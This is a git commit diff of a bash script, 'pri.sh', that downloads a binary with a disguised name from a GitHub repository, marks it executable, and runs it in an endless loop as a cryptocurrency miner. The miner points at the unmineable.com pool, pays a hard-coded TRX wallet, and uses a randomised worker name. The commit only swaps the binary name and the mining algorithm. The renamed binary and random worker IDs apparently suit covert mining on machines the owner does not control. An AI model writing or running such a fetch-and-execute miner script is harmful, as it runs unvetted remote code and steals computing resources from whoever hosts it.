72814cdd28b84f466cd9098cd56b967d3814eeed
prathhub <88438190+prathhub@users.noreply.github.com>
2021-08-05 13:55:03 +0530

    Update pri.sh

--- pri.sh
+++ pri.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
+POOL=rx.unmineable.com:3333
 WALLET=TRX:TYWmD5VqkvA9AT4Pcfgqx5asB8WC2cgodP
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
-wget https://github.com/prathhub/kaku/raw/main/priyatama
-chmod +x priyatama
+wget https://github.com/prathhub/kaku/raw/main/tama
+chmod +x tama
 while [ 1 ]; do
-./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./tama --algo chukwa --pool $POOL --user $WALLET.$WORKER --ethstratum +50000
 sleep 5
 done
 sleep 999999999 
